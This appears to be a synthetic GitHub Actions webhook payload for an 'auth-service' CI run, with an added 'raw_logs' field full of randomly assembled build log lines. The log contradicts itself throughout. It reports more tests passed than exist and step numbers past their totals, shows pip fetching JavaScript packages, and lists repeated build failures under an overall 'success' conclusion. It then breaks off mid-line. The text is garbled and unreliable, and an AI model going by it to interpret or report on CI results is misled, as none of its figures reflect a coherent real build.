{
  "action": "completed",
  "workflow_run": {
    "id": 124,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "85e57058df60f116f4fc94c9ed0078fcc0c542ea",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-17T12:17:58.093042Z",
    "updated_at": "2025-12-17T12:20:29.596323Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nArtifact uploaded: dist.zip (35MB)\nNODE_ENV=production\nCompiling src/handler.rs...\nPlatform: darwin-arm64\nStep 15/17: Testing\n\u2717 build failed with exit code 71\nPOST /api - 202 (273ms)\n\u2713 package completed\nGenerating source maps...\nSwitched to branch 'bugfix/task-111'\nGenerating source maps...\nException: TypeError\nCache hit for key-4727\nTransforming 514 files...\n\u2713 Step 'install' succeeded\nCompiling src/handler.rs...\nPlatform: linux-x64\nBuilding Docker image...\nCompiling src/main.py...\npip: Downloading jest-2.19.tar.gz\n\u2717 build failed with exit code 16\nChecking out main branch\nnpm notice: package.json updated\nCompiling components/utils.go...\nStep 14/22: Running migrations\nyarn add: Done in 30.23s\nArtifact uploaded: dist.zip (19MB)\nBundling vendor.css\nPulling image: alpine:3.11\n[12:17:58] INFO: Processing request\n[12:17:58] DEBUG: Connection pool: 20 active\nCache saved successfully\nConnecting to acme.corp:443...\n  PASS: e2e/test_auth_login.spec.js\nCreating production build...\nConnecting to startup.dev:443...\nEnvironment: production\nCache restored successfully (235MB)\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Request completed\nCoverage: 88% statements, 60% branches\nOK\nVerifying...\nArtifact downloaded: 48MB\nCompiling utils/index.js...\npip: Downloading lodash-5.6.tar.gz\nCompleted.\n  PASS: test_user_create (301ms)\nArtifact uploaded: build.tar.gz (1MB)\n[12:17:58] DEBUG: Query executed in 71ms\nGenerating source maps...\nTime: 68.230s\nTransforming 105 files...\n\u2713 Step 'test' succeeded\nPushing to registry...\nDone.\nWARNING: jest has known vulnerabilities\nnpm notice: created a lockfile\nUploading artifact 'build' (22 files)\npip: Collecting jest\npip: Collecting webpack\nWaiting...\npip: Installing build dependencies...\nGenerating source maps...\nCache miss for key-9324\n[12:17:58] ERROR: Connection failed\nTime: 6.941s\n[12:17:58] DEBUG: Memory usage: 413MB\nReady.\n[12:17:58] WARN: Deprecated API usage\nAlready up to date.\nPulling image: alpine:3.11\nRan 112 tests in 48s\n[12:17:58] INFO: Processing request\nArtifact uploaded: dist.zip (31MB)\nCompiling utils/index.js...\nUploading artifact 'build' (8 files)\nTLS handshake completed\nTime: 74.888s\nCache miss for key-7546\nnpm install: resolved 799 packages\nPlatform: win32-x64\nStep 6/23: Testing\n[12:17:58] WARN: Deprecated API usage\nCache restored successfully (55MB)\nUploading artifact 'build' (50 files)\nPOST /api - 202 (442ms)\nBundling main.css\n[12:17:58] DEBUG: Memory usage: 1834MB\nCache restored successfully (413MB)\n[12:17:58] WARN: Deprecated API usage\n\u2713 Task completed in 4296ms\nCache invalidated: node_modules\nnpm notice: package.json updated\nException: NullPointerException\nStep 20/25: Running migrations\nSnapshots: 31 passed, 26 total\n[12:17:58] DEBUG: Loading configuration\nLayer 10/13: ENV command\nCache hit for key-1923\n[12:17:58] INFO: Connecting to database\nInstalling axios@1.10.5\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Request completed\n\u2713 All checks passed\nGenerating source maps...\nStep 18/20: Installing dependencies\nLoading...\n=== Step setup_node completed ===\n=== Step: deploy_staging ===\n[12:17:58] DEBUG: Memory usage: 200MB\n\u2713 Task completed in 2496ms\npip: Downloading jest-4.7.tar.gz\nOptimizing 11 modules...\nConnection established\n\u2713 All checks passed\nOK\n  PASS: unit/test_api_health.spec.js\n[12:17:58] DEBUG: Initializing service\nLayer 5/8: RUN command\nStep 7/23: Running migrations\nNODE_ENV=test\n\u2713 Task completed in 1763ms\nPOST /upload - 202 (163ms)\n\u2717 build failed with exit code 10\nDone.\nCompiling utils/main.py...\n  PASS: integration/test_cache_hit.spec.js\nCompiling components/main.py...\nVerifying...\n\u2713 All checks passed\nArtifact downloaded: 49MB\npip: Installing build dependencies...\n[12:17:58] DEBUG: Query executed in 32ms\nCompiling utils/handler.rs...\nSwitched to branch 'bugfix/task-746'\nStep 18/15: Installing dependencies\n\u2713 Step 'install' succeeded\nLoading...\n[12:17:58] ERROR: Connection failed\n\u2713 Task completed in 2674ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'coverage' (21 files)\nFetching submodules...\nCreating production build...\nConnecting to cloud.services:443...\npip: Installing build dependencies...\n[12:17:58] DEBUG: Query executed in 20ms\nConnection established\nStep 1/22: Building\nInstalling lodash@4.9.10\nArtifact downloaded: 46MB\nSwitched to branch 'bugfix/task-231'\nUploading artifact 'dist' (19 files)\nSwitched to branch 'bugfix/task-737'\n[12:17:58] ERROR: Connection failed\n[12:17:58] ERROR: Connection failed\nCreating production build...\nnpm notice: package.json updated\nProcessing...\nWaiting...\nTransforming 658 files...\nSuccess!\n  PASS: test_api_health (297ms)\nBuilding Docker image...\nHEAD is now at 73f2727\n[12:17:58] INFO: Connecting to database\nPlatform: darwin-arm64\nHEAD is now at 2699811\nSnapshots: 6 passed, 13 total\nPOST /data - 200 (91ms)\nOptimizing 44 modules...\nHEAD is now at c31bedf\n[12:17:58] DEBUG: Initializing service\nSuccess!\n[12:17:58] DEBUG: Query executed in 87ms\npip: Installing build dependencies...\n\u2713 test completed\npip: Installing build dependencies...\nnpm notice: created a lockfile\nUsing Node.js 17.6.8\nMinifying app.js\nRan 120 tests in 22s\nTests: 111 passed, 500 total\n[12:17:58] DEBUG: Loading configuration\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out main branch\nSnapshots: 26 passed, 46 total\nCompiling utils/app.ts...\npip install: Successfully installed axios-5.7\nPlatform: win32-x64\nConnection established\n[12:17:58] INFO: Processing request\nLayer 3/9: RUN command\nConnection established\nCompleted.\nSwitched to branch 'bugfix/task-764'\nUploading artifact 'coverage' (31 files)\nArtifact uploaded: build.tar.gz (1MB)\npip install: Successfully installed express-4.7\nWaiting...\n\u2713 Task completed in 1530ms\nConnecting to cloud.services:443...\n\u2713 lint completed\n[12:17:58] INFO: Processing request\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 86ce95f\nBuilding Docker image...\nException: NullPointerException\nWARNING: express has known vulnerabilities\nOptimizing 90 modules...\nSwitched to branch 'bugfix/task-874'\n[12:17:58] DEBUG: Connection pool: 5 active\nPushing to registry...\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nCompiling lib/handler.rs...\nnpm notice: created a lockfile\nnpm notice: package.json updated\nRan 155 tests in 43s\nTLS handshake completed\nCache invalidated: node_modules\nTime: 64.68s\nSwitched to branch 'feature/task-584'\n[12:17:58] INFO: Request completed\n[12:17:58] INFO: Starting build process\nArtifact downloaded: 1MB\nOptimizing 96 modules...\n[12:17:58] INFO: Starting build process\nCache saved successfully\n\u2717 build failed with exit code 13\n  PASS: test_db_connect (382ms)\nFetching submodules...\nConnecting to test.io:443...\npip: Collecting webpack\n\u2713 All checks passed\nUsing Python 3.12\nCache saved successfully\n  PASS: e2e/test_cache_hit.spec.js\n[12:17:58] ERROR: Connection failed\nMinifying main.js\nTLS handshake completed\npip: Installing build dependencies...\nVerifying...\n[12:17:58] INFO: Connecting to database\n\u2713 Step 'checkout' succeeded\npip: Downloading axios-2.3.tar.gz\n[12:17:58] INFO: Processing request\nChecking out main branch\n\u2713 All checks passed\nUsing Python 3.11\nSuccess!\nnpm notice: package.json updated\nArtifact downloaded: 11MB\nCompleted.\n[12:17:58] INFO: Starting build process\n[12:17:58] WARN: Deprecated API usage\nReady.\nHEAD is now at a1637e4\nRan 128 tests in 32s\nRan 127 tests in 7s\nTests: 131 passed, 434 total\nnpm notice: package.json updated\nTime: 52.832s\nTests: 153 passed, 96 total\nCoverage: 73% statements, 86% branches\n[12:17:58] DEBUG: Initializing service\nCompleted.\nCache invalidated: build\n[12:17:58] DEBUG: Initializing service\n[12:17:58] DEBUG: Initializing service\n[12:17:58] DEBUG: Loading configuration\nLoading...\nHEAD is now at 87378c1\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:18\nStep 16/16: Linting\nnpm notice: package.json updated\nMinifying main.js\n[12:17:58] WARN: Deprecated API usage\nPOST /api - 202 (31ms)\nPulling image: alpine:latest\n[12:17:58] DEBUG: Initializing service\nMinifying app.js\nnpm notice: created a lockfile\nHEAD is now at d489764\nTest Suites: 22 passed, 16 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:17:58] INFO: Cache refreshed\nOptimizing 28 modules...\nCache hit for key-1292\nHEAD is now at d017aa3\nnpm install: added 373 packages\nCompiling lib/handler.rs...\npip install: Successfully installed eslint-3.1\npip install: Successfully installed webpack-5.10\nFinished.\nCompiling src/handler.rs...\nNODE_ENV=development\n[12:17:58] WARN: Deprecated API usage\nStep 10/18: Building\n[12:17:58] ERROR: Connection failed\nCreating production build...\nWARNING: react has known vulnerabilities\n[12:17:58] DEBUG: Connection pool: 13 active\n[12:17:58] WARN: Deprecated API usage\nnpm notice: created a lockfile\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Processing request\nStep 16/15: Testing\nCompiling components/handler.rs...\nHEAD is now at c6aa033\nCache invalidated: dependencies\nChecking out develop branch\nnpm notice: package.json updated\n[12:17:58] DEBUG: Memory usage: 1569MB\nInstalling eslint@2.3.3\nBuilding Docker image...\nConnecting to test.io:443...\n[12:17:58] INFO: Connecting to database\nCompiling components/app.ts...\nCompiling utils/service.java...\nWARNING: jest has known vulnerabilities\nArtifact downloaded: 12MB\n=== Step integration_tests completed ===\n=== Step: build ===\nOptimizing 60 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 20.8.2\nCache restored successfully (424MB)\nFetching submodules...\nnpm notice: created a lockfile\nMinifying app.js\n[12:17:58] DEBUG: Connection pool: 18 active\n  PASS: test_user_create (190ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:58] ERROR: Connection failed\nVerifying...\nWARNING: axios has known vulnerabilities\nProcessing...\nAlready up to date.\nUsing Python 3.12\nUploading artifact 'dist' (5 files)\n[12:17:58] INFO: Processing request\n[12:17:58] INFO: Starting build process\n\u2713 All checks passed\nSnapshots: 6 passed, 29 total\nPulling image: node:latest\nnpm notice: package.json updated\n[12:17:58] INFO: Cache refreshed\npip install: Successfully installed prettier-5.2\nnpm notice: package.json updated\n[12:17:58] INFO: Connecting to database\nCache hit for key-5845\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 Step 'build' succeeded\nnpm notice: created a lockfile\nUsing Node.js 20.6.7\nHEAD is now at 68762db\nnpm notice: created a lockfile\nnpm install: resolved 878 packages\n\u2713 test completed\nException: TypeError\nArtifact uploaded: dist.zip (59MB)\nProcessing...\nTransforming 124 files...\npip: Installing build dependencies...\nBuilding Docker image...\n[12:17:58] ERROR: Connection failed\nDone.\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] DEBUG: Loading configuration\nPOST /api - 201 (57ms)\n[12:17:58] INFO: Request completed\nCache restored successfully (60MB)\nCompleted.\nPlatform: linux-x64\nCreating production build...\nUsing Node.js 15.9.0\nAlready up to date.\nCache saved successfully\nVerifying...\nCache saved successfully\nEnvironment: test\nNODE_ENV=development\nSwitched to branch 'hotfix/task-180'\n[12:17:58] DEBUG: Initializing service\nSwitched to branch 'feature/task-390'\npip: Downloading lodash-2.20.tar.gz\nCache invalidated: build\n  PASS: test_api_health (13ms)\nTLS handshake completed\nPulling image: python:latest\nLoading...\nOK\nCompiling utils/service.java...\npip: Collecting prettier\nSnapshots: 11 passed, 6 total\n[12:17:58] INFO: Connecting to database\nException: NullPointerException\nEnvironment: production\npip: Downloading eslint-5.3.tar.gz\nImage pulled successfully\nStep 1/18: Running migrations\nnpm notice: created a lockfile\npip: Downloading express-2.3.tar.gz\nCompiling src/index.js...\nTime: 61.277s\nFinished.\nPushing to registry...\n[12:17:58] WARN: Deprecated API usage\nTime: 83.2s\nImage pulled successfully\nFAILED: test_auth_login\nPushing to registry...\nSuccess!\nTransforming 163 files...\nCache miss for key-3105\nUsing Node.js 19.17.9\n\u2713 validate completed\n\u2713 lint completed\n  PASS: test_user_create (110ms)\nCompleted.\n[12:17:58] DEBUG: Loading configuration\nUploading artifact 'dist' (27 files)\n[12:17:58] WARN: Deprecated API usage\nTransforming 774 files...\nSwitched to branch 'hotfix/task-243'\nArtifact downloaded: 35MB\nBuilding Docker image...\n[12:17:58] DEBUG: Connection pool: 13 active\nStep 14/17: Building\n  PASS: test_auth_login (40ms)\nStep 12/21: Deploying\n=== Step build completed ===\n=== Step: checkout ===\nFinished.\nFinished.\nUsing Node.js 18.15.7\nTests: 491 passed, 137 total\nCache restored successfully (130MB)\nFetching submodules...\nMinifying app.js\nTime: 99.700s\nConnecting to startup.dev:443...\nWARNING: express has known vulnerabilities\nSnapshots: 46 passed, 0 total\nUploading artifact 'dist' (41 files)\nTLS handshake completed\n[12:17:58] INFO: Cache refreshed\nnpm notice: package.json updated\nConnecting to example.com:443...\nUsing Python 3.11\nOptimizing 15 modules...\nTest Suites: 40 passed, 49 total\nyarn add: Done in 26.25s\nTLS handshake completed\nConnection established\nTime: 73.786s\nStep 15/17: Building\nChecking out master branch\nnpm install: resolved 1409 packages\nArtifact uploaded: dist.zip (22MB)\nOptimizing 78 modules...\nBundling main.css\n\u2713 lint completed\nLayer 10/13: COPY command\nyarn add: Done in 25.62s\n[12:17:58] DEBUG: Memory usage: 141MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\nFinished.\nNODE_ENV=development\nNODE_ENV=production\nSuccess!\nTests: 431 passed, 375 total\nCompiling components/handler.rs...\nFinished.\n[12:17:58] DEBUG: Connection pool: 8 active\nVerifying...\nTime: 37.710s\nCompiling components/index.js...\npip: Downloading eslint-5.3.tar.gz\nPushing to registry...\npip: Installing build dependencies...\nFinished.\nWARNING: jest has known vulnerabilities\n[12:17:58] DEBUG: Loading configuration\n[12:17:58] DEBUG: Memory usage: 759MB\n[12:17:58] DEBUG: Memory usage: 1864MB\n\u2713 All checks passed\nPushing to registry...\nCache miss for key-5465\nStep 12/23: Installing dependencies\n[12:17:58] INFO: Connecting to database\nnpm install: added 81 packages\npip: Installing build dependencies...\nImage pulled successfully\nProcessing...\nHEAD is now at 06ed08a\nHEAD is now at 323dee3\n[12:17:58] DEBUG: Connection pool: 1 active\nStep 20/16: Running migrations\nConnection established\nUsing Node.js 16.16.5\nnpm install: resolved 1222 packages\nCompleted.\nArtifact uploaded: dist.zip (64MB)\nCache restored successfully (376MB)\n[12:17:58] INFO: Request completed\nImage pulled successfully\nPlatform: win32-x64\nnpm install: added 157 packages\n[12:17:58] INFO: Cache refreshed\nWARNING: lodash has known vulnerabilities\nInstalling prettier@1.11.2\nCompiling utils/index.js...\nStep 16/16: Installing dependencies\nSwitched to branch 'bugfix/task-872'\nnpm install: resolved 350 packages\nSuccess!\nArtifact uploaded: build.tar.gz (42MB)\nUsing Python 3.11\n[12:17:58] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\nPulling image: python:3.11\n[12:17:58] INFO: Request completed\nReady.\nMinifying vendor.js\nLoading...\nLayer 2/11: RUN command\nCoverage: 80% statements, 81% branches\nBundling runtime.js\nUsing Node.js 14.5.7\n  PASS: integration/test_db_connect.spec.js\n\u2713 build completed\nCache restored successfully (362MB)\n[12:17:58] INFO: Processing request\nOK\nCache saved successfully\npip: Downloading lodash-4.5.tar.gz\nPOST /api - 200 (320ms)\n[12:17:58] ERROR: Connection failed\n=== Step checkout completed ===\n=== Step: save_cache ===\nNODE_ENV=production\nUsing Node.js 18.6.0\n[12:17:58] INFO: Processing request\npip install: Successfully installed express-5.14\nStep 10/18: Building\nException: ValueError\nInstalling react@5.7.7\nInstalling lodash@4.14.6\nTransforming 558 files...\nOptimizing 79 modules...\nInstalling prettier@1.2.1\nSuccess!\n[12:17:58] INFO: Connecting to database\nCache miss for key-9413\nSnapshots: 17 passed, 18 total\nUsing Node.js 14.17.2\nCompiling src/main.py...\nUsing Python 3.9\nCompiling utils/main.py...\n[12:17:58] WARN: Deprecated API usage\nFinished.\nMinifying app.js\nInstalling eslint@3.13.2\n  PASS: test_cache_hit (243ms)\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-337'\nCache saved successfully\nEnvironment: test\nOptimizing 61 modules...\nTime: 80.978s\n[12:17:58] INFO: Starting build process\npip install: Successfully installed jest-1.5\nPOST /api - 200 (222ms)\nEnvironment: test\nVerifying...\nMinifying main.js\nPOST /upload - 200 (500ms)\nTLS handshake completed\nnpm install: added 168 packages\nUsing Python 3.12\nArtifact uploaded: dist.zip (54MB)\nArtifact uploaded: dist.zip (69MB)\nCompiling src/service.java...\nUploading artifact 'build' (41 files)\n[12:17:58] INFO: Request completed\nOptimizing 78 modules...\nVerifying...\nRan 97 tests in 49s\nStep 10/17: Installing dependencies\nCompleted.\n[12:17:58] DEBUG: Loading configuration\nVerifying...\nBundling vendor.js\npip: Downloading react-3.16.tar.gz\nStep 16/21: Testing\nTest Suites: 16 passed, 8 total\nTest Suites: 7 passed, 9 total\nUploading artifact 'dist' (43 files)\n[12:17:58] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\n[12:17:58] WARN: Deprecated API usage\nSnapshots: 26 passed, 29 total\nStep 4/22: Building\nCompleted.\n\u2713 All checks passed\nCompiling src/handler.rs...\npip: Installing build dependencies...\nReady.\nCompleted.\nWARNING: express has known vulnerabilities\nPushing to registry...\n  PASS: test_api_health (398ms)\n[12:17:58] WARN: Deprecated API usage\nStep 1/21: Testing\n[12:17:58] DEBUG: Query executed in 95ms\nStep 11/17: Installing dependencies\nGET /status - 204 (21ms)\nCache miss for key-9289\nArtifact uploaded: build.tar.gz (21MB)\nTests: 439 passed, 59 total\nCache invalidated: node_modules\npip: Collecting prettier\nSnapshots: 19 passed, 8 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 2/17: Building\nDone.\nPOST /api - 200 (37ms)\nEnvironment: staging\npip: Installing build dependencies...\nTime: 37.822s\nGenerating source maps...\nTLS handshake completed\nStep 12/23: Building\n\u2717 build failed with exit code 90\n[12:17:58] ERROR: Connection failed\nWARNING: express has known vulnerabilities\n[12:17:58] DEBUG: Loading configuration\nEnvironment: staging\n[12:17:58] ERROR: Connection failed\n\u2713 validate completed\nCompiling lib/index.js...\nTest Suites: 49 passed, 25 total\n\u2717 build failed with exit code 25\nInstalling webpack@4.18.2\nCompleted.\nCache miss for key-7461\n[12:17:58] INFO: Request completed\nCache miss for key-5857\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nLayer 2/8: ENV command\nArtifact downloaded: 4MB\n  PASS: test_api_health (153ms)\nVerifying...\nWaiting...\nCache miss for key-3259\nWaiting...\nStep 17/17: Linting\nTLS handshake completed\n\u2713 package completed\npip: Installing build dependencies...\nMinifying main.js\nConnecting to example.com:443...\n  PASS: test_api_health (221ms)\nSuccess!\nBundling vendor.css\nReady.\nVerifying...\nCache saved successfully\nAlready up to date.\nnpm install: resolved 494 packages\nTest Suites: 33 passed, 42 total\nOptimizing 64 modules...\nGenerating source maps...\nGET /api - 201 (38ms)\nArtifact downloaded: 6MB\nTime: 8.429s\nyarn add: Done in 30.31s\n[12:17:58] INFO: Request completed\n[12:17:58] ERROR: Connection failed\npip: Collecting lodash\n[12:17:58] ERROR: Connection failed\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Cache refreshed\nStep 20/25: Building\nWARNING: prettier has known vulnerabilities\nPlatform: darwin-arm64\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nLayer 3/11: RUN command\nEnvironment: test\nPOST /api - 201 (101ms)\nTransforming 339 files...\n[12:17:58] INFO: Cache refreshed\nImage pulled successfully\n  PASS: integration/test_api_health.spec.js\nWaiting...\nOK\nWARNING: eslint has known vulnerabilities\nOptimizing 73 modules...\nUploading artifact 'build' (49 files)\nWARNING: jest has known vulnerabilities\npip install: Successfully installed eslint-2.3\nConnection established\nPulling image: node:3.11\n\u2717 build failed with exit code 76\nBuilding Docker image...\nConnecting to startup.dev:443...\nSuccess!\nSnapshots: 3 passed, 4 total\n[12:17:58] WARN: Deprecated API usage\nUploading artifact 'coverage' (5 files)\nConnecting to startup.dev:443...\n[12:17:58] DEBUG: Query executed in 82ms\nOptimizing 60 modules...\nCompiling components/app.ts...\nCompiling utils/index.js...\nStep 5/22: Testing\nPOST /api - 201 (262ms)\nTLS handshake completed\n[12:17:58] ERROR: Connection failed\n[12:17:58] WARN: Deprecated API usage\nCompiling src/handler.rs...\nImage pulled successfully\nDone.\n[12:17:58] DEBUG: Query executed in 80ms\nLayer 8/8: RUN command\nLayer 10/14: COPY command\n[12:17:58] ERROR: Connection failed\nTests: 315 passed, 69 total\npip: Downloading webpack-4.17.tar.gz\nCoverage: 92% statements, 85% branches\n[12:17:58] DEBUG: Initializing service\nArtifact uploaded: dist.zip (51MB)\nRan 167 tests in 8s\n[12:17:58] WARN: Deprecated API usage\nnpm notice: package.json updated\n[12:17:58] DEBUG: Connection pool: 8 active\npip: Downloading webpack-5.11.tar.gz\nPlatform: darwin-arm64\n\u2713 Task completed in 1519ms\nCache saved successfully\npip install: Successfully installed axios-3.12\nReady.\n[12:17:58] INFO: Request completed\nCompiling src/index.js...\nSwitched to branch 'hotfix/task-155'\nFAILED: test_db_connect\nFAILED: test_cache_hit\nProcessing...\n\u2713 All checks passed\nCache saved successfully\nCache miss for key-1050\n[12:17:58] INFO: Request completed\nStep 17/17: Linting\nnpm install: resolved 738 packages\nBuilding Docker image...\n=== Step install_dependencies completed ===\n=== Step: type_check ===\nCache restored successfully (337MB)\nCreating production build...\nBuilding Docker image...\nOK\npip: Downloading eslint-2.15.tar.gz\nAlready up to date.\nLayer 5/9: RUN command\nGenerating source maps...\nProcessing...\nBuilding Docker image...\nOptimizing 70 modules...\nOK\nArtifact downloaded: 8MB\nConnection established\nCache restored successfully (238MB)\nConnection established\nFinished.\n  PASS: e2e/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nDone.\nStep 1/25: Linting\n\u2713 Task completed in 3979ms\n[12:17:58] DEBUG: Loading configuration\n\u2717 build failed with exit code 100\n[12:17:58] INFO: Request completed\n[12:17:58] WARN: Deprecated API usage\nCreating production build...\n[12:17:58] INFO: Processing request\nBuilding Docker image...\nImage pulled successfully\nChecking out main branch\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (4MB)\nStep 14/24: Testing\nSnapshots: 9 passed, 11 total\nCache invalidated: dependencies\nUploading artifact 'dist' (36 files)\nFetching submodules...\nnpm install: resolved 1171 packages\nArtifact downloaded: 12MB\nTLS handshake completed\nOK\n[12:17:58] WARN: Deprecated API usage\nOK\nReady.\nFetching submodules...\nTests: 136 passed, 460 total\nFinished.\nUploading artifact 'build' (36 files)\nTest Suites: 39 passed, 47 total\nnpm install: added 332 packages\nSnapshots: 50 passed, 35 total\n[12:17:58] INFO: Connecting to database\n[12:17:58] DEBUG: Initializing service\nArtifact uploaded: dist.zip (27MB)\npip: Downloading prettier-4.10.tar.gz\nConnection established\nGET /health - 204 (11ms)\n[12:17:58] INFO: Starting build process\nStep 14/19: Linting\nTime: 82.455s\n[12:17:58] INFO: Starting build process\n  PASS: test_user_create (181ms)\nCoverage: 74% statements, 99% branches\nTests: 379 passed, 484 total\nCache restored successfully (11MB)\n  PASS: test_api_health (270ms)\nFAILED: test_db_connect\nException: RuntimeError\nUsing Python 3.10\nnpm notice: created a lockfile\npip install: Successfully installed axios-1.15\nStep 2/15: Linting\nTransforming 968 files...\nException: RuntimeError\nCache restored successfully (208MB)\nPushing to registry...\nTest Suites: 13 passed, 37 total\nUploading artifact 'coverage' (42 files)\nCache restored successfully (79MB)\nCache saved successfully\nSwitched to branch 'hotfix/task-580'\nNODE_ENV=test\nnpm install: added 490 packages\nReady.\nBuilding Docker image...\nArtifact uploaded: dist.zip (73MB)\nArtifact downloaded: 15MB\nSuccess!\nTLS handshake completed\nStep 17/18: Deploying\nStep 2/19: Testing\nPulling image: alpine:3.11\nMinifying main.js\nRan 142 tests in 36s\nOptimizing 70 modules...\nUsing Node.js 19.16.9\nStep 8/15: Testing\nFinished.\nStep 7/21: Building\nCompiling utils/service.java...\nWARNING: eslint has known vulnerabilities\nStep 1/17: Testing\npip: Installing build dependencies...\nCache hit for key-3657\nSuccess!\npip install: Successfully installed react-3.18\n=== Step type_check completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nUsing Node.js 15.0.9\nAlready up to date.\nFetching submodules...\nTLS handshake completed\n[12:17:58] DEBUG: Memory usage: 649MB\nPushing to registry...\npip install: Successfully installed jest-3.7\n\u2717 build failed with exit code 36\n\u2713 Step 'test' succeeded\nCache saved successfully\nLayer 3/11: ENV command\n\u2717 build failed with exit code 14\nStep 6/22: Running migrations\nFetching submodules...\nWARNING: react has known vulnerabilities\nCompleted.\nSnapshots: 42 passed, 11 total\nCache hit for key-7634\nArtifact uploaded: dist.zip (84MB)\nMinifying app.js\nProcessing...\n\u2713 Step 'checkout' succeeded\nMinifying app.js\n  PASS: integration/test_user_create.spec.js\nStep 15/25: Deploying\n[12:17:58] WARN: Deprecated API usage\nStep 6/22: Installing dependencies\n[12:17:58] ERROR: Connection failed\nArtifact uploaded: dist.zip (67MB)\nCompleted.\nSwitched to branch 'feature/task-945'\nCache miss for key-7515\nHEAD is now at b02b689\nLayer 5/12: ENV command\nCache invalidated: build\n[12:17:58] INFO: Cache refreshed\nAlready up to date.\nUsing Node.js 14.9.8\nTransforming 978 files...\nReady.\nOK\n[12:17:58] INFO: Processing request\nFinished.\nWARNING: axios has known vulnerabilities\nFinished.\nnpm notice: created a lockfile\nCoverage: 86% statements, 92% branches\nArtifact uploaded: build.tar.gz (10MB)\nReady.\nFinished.\n[12:17:58] INFO: Starting build process\nLoading...\nFAILED: test_db_connect\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 95 tests in 47s\nCompleted.\nTransforming 726 files...\nReady.\nPlatform: darwin-arm64\nWARNING: webpack has known vulnerabilities\nSwitched to branch 'hotfix/task-532'\nCompleted.\n[12:17:58] DEBUG: Connection pool: 4 active\nStep 11/18: Running migrations\nPushing to registry...\nWARNING: jest has known vulnerabilities\nnpm install: resolved 831 packages\nEnvironment: development\nLayer 2/14: COPY command\nRan 159 tests in 56s\nBundling vendor.css\nFinished.\nnpm install: added 215 packages\nTime: 22.502s\nCache miss for key-3766\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nFinished.\nUsing Node.js 14.2.4\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 764 files...\nTest Suites: 44 passed, 28 total\nPushing to registry...\n[12:17:58] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\n[12:17:58] INFO: Connecting to database\n[12:17:58] DEBUG: Memory usage: 1164MB\nCache invalidated: dependencies\nCoverage: 90% statements, 83% branches\nGenerating source maps...\nSuccess!\nTests: 251 passed, 140 total\nOptimizing 18 modules...\nOK\nPulling image: python:18\nCache restored successfully (189MB)\nInstalling react@4.1.0\n[12:17:58] DEBUG: Query executed in 14ms\n[12:17:58] INFO: Request completed\nConnection established\n[12:17:58] INFO: Starting build process\nStep 14/25: Installing dependencies\nPlatform: darwin-arm64\nRan 80 tests in 40s\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\nWaiting...\nConnection established\nCompleted.\nnpm notice: package.json updated\nTLS handshake completed\nLayer 5/8: RUN command\nRan 61 tests in 60s\nArtifact uploaded: build.tar.gz (34MB)\nPOST /api - 200 (178ms)\nDone.\nEnvironment: production\n[12:17:58] INFO: Processing request\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (396MB)\nMinifying main.js\n\u2713 validate completed\nFetching submodules...\nFinished.\nStep 15/20: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 96% statements, 76% branches\nRan 29 tests in 60s\nFAILED: test_auth_login\nConnection established\npip: Collecting express\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Starting build process\nPOST /api - 201 (153ms)\nOK\nTests: 125 passed, 84 total\nStep 4/18: Testing\nLayer 6/9: RUN command\nArtifact uploaded: build.tar.gz (17MB)\nCache restored successfully (431MB)\nLayer 7/11: RUN command\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Cache refreshed\nImage pulled successfully\nOK\nUploading artifact 'build' (41 files)\n[12:17:58] DEBUG: Initializing service\nCompiling src/service.java...\nTransforming 375 files...\npip: Installing build dependencies...\nUsing Python 3.10\nEnvironment: development\nStep 4/15: Running migrations\npip: Downloading webpack-1.12.tar.gz\nCompiling utils/service.java...\nStep 18/16: Building\nnpm notice: package.json updated\nTransforming 123 files...\nTests: 401 passed, 376 total\nArtifact uploaded: build.tar.gz (26MB)\nAlready up to date.\npip: Installing build dependencies...\nTests: 112 passed, 165 total\n[12:17:58] WARN: Deprecated API usage\nConnection established\nFetching submodules...\nStep 9/24: Building\nNODE_ENV=development\nGenerating source maps...\nHEAD is now at 